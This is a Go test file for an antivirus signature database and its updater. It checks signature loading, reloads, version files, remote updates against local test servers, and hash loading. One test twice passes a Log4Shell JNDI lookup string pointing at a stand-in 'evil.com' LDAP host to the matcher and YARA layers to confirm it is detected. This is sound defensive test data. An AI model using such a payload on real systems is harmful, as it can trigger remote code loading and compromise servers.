package sigdb

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"

	"axiomnizam.bitbd.net/axiomnizam/internal/antivirus"
	"axiomnizam.bitbd.net/axiomnizam/internal/antivirus/hashdb"
	"axiomnizam.bitbd.net/axiomnizam/internal/antivirus/matcher"
	"axiomnizam.bitbd.net/axiomnizam/internal/antivirus/yara"
)

// ─────────────────────────────────────────────────────────────────────────────
// Database Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestDatabase_Init_BuiltinOnly(t *testing.T) {
	dir := t.TempDir()
	db := New(dir)

	// Create layers.
	mLayer := matcher.NewLayer(nil)
	yLayer := yara.NewLayer(nil)
	db.SetLayers(nil, mLayer, yLayer)

	ver, err := db.Init()
	if err != nil {
		t.Fatalf("init error: %v", err)
	}
	if ver.PatternCount == 0 {
		t.Error("expected built-in patterns")
	}
	if ver.YARACount == 0 {
		t.Error("expected built-in YARA rules")
	}
	if ver.Version != "builtin-only" {
		t.Errorf("expected 'builtin-only' version, got %q", ver.Version)
	}
	t.Logf("init: patterns=%d yara=%d", ver.PatternCount, ver.YARACount)
}

func TestDatabase_Init_WithDiskSignatures(t *testing.T) {
	dir := t.TempDir()

	// Create disk signature files.
	yaraDir := filepath.Join(dir, "yara")
	os.MkdirAll(yaraDir, 0755)
	os.WriteFile(filepath.Join(yaraDir, "custom.yar"), []byte(`rule DiskRule {
	strings:
		$s1 = "disk_test_pattern"
	condition:
		$s1
}`), 0644)

	patternDir := filepath.Join(dir, "patterns")
	os.MkdirAll(patternDir, 0755)
	hexP := hex.EncodeToString([]byte("disk_pattern_test_ab"))
	os.WriteFile(filepath.Join(patternDir, "custom.ndb"),
		[]byte(fmt.Sprintf("Disk.Test:0:*:%s\n", hexP)), 0644)

	db := New(dir)
	mLayer := matcher.NewLayer(nil)
	yLayer := yara.NewLayer(nil)
	db.SetLayers(nil, mLayer, yLayer)

	ver, err := db.Init()
	if err != nil {
		t.Fatalf("init error: %v", err)
	}
	if ver.PatternCount <= matcher.BuiltinPatternCount() {
		t.Error("expected disk patterns in addition to built-in")
	}
	if ver.YARACount <= yara.BuiltinRuleCount() {
		t.Error("expected disk YARA rules in addition to built-in")
	}
}

func TestDatabase_Reload(t *testing.T) {
	dir := t.TempDir()
	db := New(dir)

	mLayer := matcher.NewLayer(nil)
	yLayer := yara.NewLayer(nil)
	db.SetLayers(nil, mLayer, yLayer)

	db.Init()

	ver, err := db.Reload()
	if err != nil {
		t.Fatalf("reload error: %v", err)
	}
	if ver.Source != "reload" {
		t.Errorf("expected source 'reload', got %q", ver.Source)
	}

	stats := db.Stats()
	if stats.ReloadCount != 1 {
		t.Errorf("expected reload count 1, got %d", stats.ReloadCount)
	}
}

func TestDatabase_WriteAndReadVersion(t *testing.T) {
	dir := t.TempDir()
	db := New(dir)

	ver := Version{
		Version:   "2026.05.13",
		UpdatedAt: time.Now(),
		Source:    "test",
	}
	if err := db.WriteVersion(ver); err != nil {
		t.Fatalf("write version error: %v", err)
	}

	readVer := db.readVersionFromDisk()
	if readVer != "2026.05.13" {
		t.Errorf("expected '2026.05.13', got %q", readVer)
	}
}

func TestDatabase_VersionMissingFile(t *testing.T) {
	db := New(t.TempDir())
	ver := db.readVersionFromDisk()
	if ver != "builtin-only" {
		t.Errorf("missing version.json should return 'builtin-only', got %q", ver)
	}
}

func TestDatabase_Init_NoSigDir(t *testing.T) {
	db := New("")
	mLayer := matcher.NewLayer(nil)
	db.SetLayers(nil, mLayer, nil)

	ver, err := db.Init()
	if err != nil {
		t.Fatalf("init error: %v", err)
	}
	if ver.PatternCount == 0 {
		t.Error("expected built-in patterns even without sigDir")
	}
}

func TestDatabase_LayerIntegration(t *testing.T) {
	dir := t.TempDir()
	db := New(dir)

	mLayer := matcher.NewLayer(nil)
	yLayer := yara.NewLayer(nil)
	db.SetLayers(nil, mLayer, yLayer)
	db.Init()

	// Verify matcher layer can detect built-in patterns.
	threats, err := mLayer.Scan(&antivirus.ScanTarget{
		Content:  []byte(`${jndi:ldap://evil.com/exploit}`),
		Filename: "test.txt",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(threats) == 0 {
		t.Error("matcher should detect Log4Shell after Init()")
	}

	// Verify YARA layer can detect built-in rules.
	threats, err = yLayer.Scan(&antivirus.ScanTarget{
		Content:  []byte(`${jndi:ldap://evil.com/exploit}`),
		Filename: "test.txt",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(threats) == 0 {
		t.Error("YARA should detect Log4Shell after Init()")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Updater Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestUpdater_StartStop(t *testing.T) {
	db := New(t.TempDir())
	u := NewUpdater(db, "http://localhost:9999", time.Hour)

	ctx := context.Background()
	u.Start(ctx)

	stats := u.Stats()
	if !stats.Running {
		t.Error("expected running=true after Start")
	}

	u.Stop()
	stats = u.Stats()
	if stats.Running {
		t.Error("expected running=false after Stop")
	}
}

func TestUpdater_StartNoURL(t *testing.T) {
	db := New(t.TempDir())
	u := NewUpdater(db, "", time.Hour)

	u.Start(context.Background())
	if u.Stats().Running {
		t.Error("should not start with empty URL")
	}
}

func TestUpdater_ForceCheck_UpToDate(t *testing.T) {
	dir := t.TempDir()
	db := New(dir)
	mLayer := matcher.NewLayer(nil)
	db.SetLayers(nil, mLayer, nil)
	db.Init()

	// Set up a test server that returns the same version.
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/version.json" {
			json.NewEncoder(w).Encode(RemoteVersion{
				Version: "builtin-only",
			})
		}
	}))
	defer server.Close()

	u := NewUpdater(db, server.URL, time.Hour)
	u.ForceCheck(context.Background())

	stats := u.Stats()
	if stats.Updates != 0 {
		t.Errorf("expected 0 updates when up-to-date, got %d", stats.Updates)
	}
	if stats.LastError != "" {
		t.Errorf("expected no error, got %q", stats.LastError)
	}
}

func TestUpdater_ForceCheck_NewVersion(t *testing.T) {
	dir := t.TempDir()
	db := New(dir)
	mLayer := matcher.NewLayer(nil)
	yLayer := yara.NewLayer(nil)
	db.SetLayers(nil, mLayer, yLayer)
	db.Init()

	// Test server with a new version + downloadable file.
	yaraContent := `rule UpdatedRule {
	strings:
		$s1 = "updated_pattern"
	condition:
		$s1
}`
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/version.json":
			json.NewEncoder(w).Encode(RemoteVersion{
				Version: "2026.05.13.1",
				Files: []RemoteFile{
					{
						Name:     "yara/updated.yar",
						URL:      "", // will be set below
						Category: "yara",
					},
				},
			})
		case "/files/updated.yar":
			w.Write([]byte(yaraContent))
		default:
			http.NotFound(w, r)
		}
	}))
	defer server.Close()

	// Patch the file URL to point to our test server.
	// We need to create a custom handler that includes the correct URL.
	server2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/version.json":
			rv := RemoteVersion{
				Version: "2026.05.13.1",
				Files: []RemoteFile{
					{
						Name:     "yara/updated.yar",
						URL:      server.URL + "/files/updated.yar",
						Category: "yara",
					},
				},
			}
			json.NewEncoder(w).Encode(rv)
		default:
			http.NotFound(w, r)
		}
	}))
	defer server2.Close()

	u := NewUpdater(db, server2.URL, time.Hour)
	u.ForceCheck(context.Background())

	stats := u.Stats()
	if stats.Updates != 1 {
		t.Errorf("expected 1 update, got %d", stats.Updates)
	}

	// Verify the file was downloaded.
	downloadedPath := filepath.Join(dir, "yara", "updated.yar")
	if _, err := os.Stat(downloadedPath); os.IsNotExist(err) {
		t.Error("downloaded YARA file should exist on disk")
	}
}

func TestUpdater_ForceCheck_ServerDown(t *testing.T) {
	db := New(t.TempDir())
	mLayer := matcher.NewLayer(nil)
	db.SetLayers(nil, mLayer, nil)
	db.Init()

	u := NewUpdater(db, "http://localhost:1", time.Hour) // unreachable
	u.ForceCheck(context.Background())

	stats := u.Stats()
	if stats.LastError == "" {
		t.Error("expected error when server is unreachable")
	}
	if stats.Updates != 0 {
		t.Error("should have 0 updates on failure")
	}
}

func TestUpdater_Stats(t *testing.T) {
	u := NewUpdater(New(t.TempDir()), "http://example.com", 6*time.Hour)
	stats := u.Stats()
	if stats.URL != "http://example.com" {
		t.Errorf("wrong URL: %s", stats.URL)
	}
	if stats.Interval != "6h0m0s" {
		t.Errorf("wrong interval: %s", stats.Interval)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Hash layer disk loading (verify integration path)
// ─────────────────────────────────────────────────────────────────────────────

func TestDatabase_HashLayerLoading(t *testing.T) {
	dir := t.TempDir()

	// Create a hash file.
	hashDir := filepath.Join(dir, "hashes")
	os.MkdirAll(hashDir, 0755)
	hashContent := `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855:0:TestHash.Clean`
	os.WriteFile(filepath.Join(hashDir, "test.hdb"), []byte(hashContent+"\n"), 0644)

	db := New(dir)
	hDB := hashdb.New(0, 0)
	db.SetLayers(hDB, nil, nil)

	ver, err := db.Init()
	if err != nil {
		t.Fatalf("init error: %v", err)
	}
	if ver.HashCount == 0 {
		t.Error("expected loaded hashes from disk")
	}
}
